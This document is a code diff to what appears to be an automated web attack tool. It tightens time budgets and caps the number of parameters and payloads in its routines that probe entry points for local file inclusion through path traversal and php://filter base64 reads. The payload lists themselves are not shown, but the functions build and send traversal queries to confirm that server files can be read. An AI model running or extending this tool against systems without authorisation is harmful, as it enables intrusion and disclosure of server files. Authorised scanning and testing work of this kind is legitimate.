@@ -169,7 +169,7 @@ def sweep_exposures(host, pool=None):
 def discover_targets(host, pool=None):
     """Collect parameterised entry points; LFI params rank first."""
     targets = []
-    root = _get(host, '/', max_bytes=262144)
+    root = _get(host, '/', max_bytes=131072)
     if root.get('error'):
         return targets
     text = net_client.text_of(root)
@@ -221,13 +221,20 @@ def routed_params(host, path, pool=None):
     return [name for name in LFI_PARAMS if name + '=' in text or f'name="{name}"' in text]
 
 
-def test_lfi(host, path, params, pool=None):
-    """Confirm path traversal by reading a file only the server can produce."""
+def test_lfi(host, path, params, pool=None, deadline=None):
+    """Confirm path traversal by reading a file only the server can produce.
+
+    Bounded on purpose: a fast scan cannot afford 6 params x 6 payloads on
+    every entry point, so the strongest three params and four payloads are
+    tried, and the deadline cuts the sweep the moment the budget is spent.
+    """
     confirmed = []
     ordered = [name for name in params if name.lower() in LFI_PARAMS] + \
               [name for name in params if name.lower() not in LFI_PARAMS]
-    for name in ordered[:6]:
-        for payload in TRAVERSAL_PAYLOADS:
+    for name in ordered[:3]:
+        for payload in TRAVERSAL_PAYLOADS[:4]:
+            if deadline is not None and time.perf_counter() > deadline:
+                return confirmed
             query = f'{quote(name)}={quote(payload, safe="")}'
             full = f'{path}?{query}' if '?' not in path else f'{path}&{query}'
             try:
@@ -249,10 +256,12 @@ def test_lfi(host, path, params, pool=None):
     return confirmed
 
 
-def test_filter_chain(host, path, params, pool=None):
+def test_filter_chain(host, path, params, pool=None, deadline=None):
     """php://filter read: decode base64 and require a real PHP open tag."""
-    for name in [item for item in params if item.lower() in LFI_PARAMS] or params:
-        for payload in FILTER_PAYLOADS:
+    for name in ([item for item in params if item.lower() in LFI_PARAMS] or params)[:2]:
+        for payload in FILTER_PAYLOADS[:2]:
+            if deadline is not None and time.perf_counter() > deadline:
+                return None
             query = f'{quote(name)}={quote(payload, safe="")}'
             full = f'{path}?{query}' if '?' not in path else f'{path}&{query}'
             try:
@@ -351,18 +360,20 @@ def attack(host, findings=None, pool=None, budget_seconds=45, php_hint=False):
     targets = discover_targets(host, pool)
     result['targets'] = [{'path': item['path'], 'params': item['params']} for item in targets[:6]]
     lfi_found = False
+    deadline = started + max(6.0, min(budget_seconds, 20.0))
     for target in targets[:4]:
-        if time.perf_counter() - started > budget_seconds:
+        if time.perf_counter() > deadline:
             result['chain'].append({'step': 'budget-exhausted'})
             break
-        hits = test_lfi(host, target['path'], target['params'], pool)
+        hits = test_lfi(host, target['path'], target['params'], pool, deadline=deadline)
         if hits:
             lfi_found = True
             for hit in hits:
                 result['confirmed'].append({'kind': 'LFI', **hit})
             result['chain'].append({'step': 'lfi', 'path': target['path'], 'hits': len(hits)})
             break
-        filtered = test_filter_chain(host, target['path'], target['params'], pool)
+        filtered = test_filter_chain(host, target['path'], target['params'], pool,
+                                     deadline=deadline)
         if filtered:
             lfi_found = True
             result['confirmed'].append({'kind': 'LFI', **filtered})
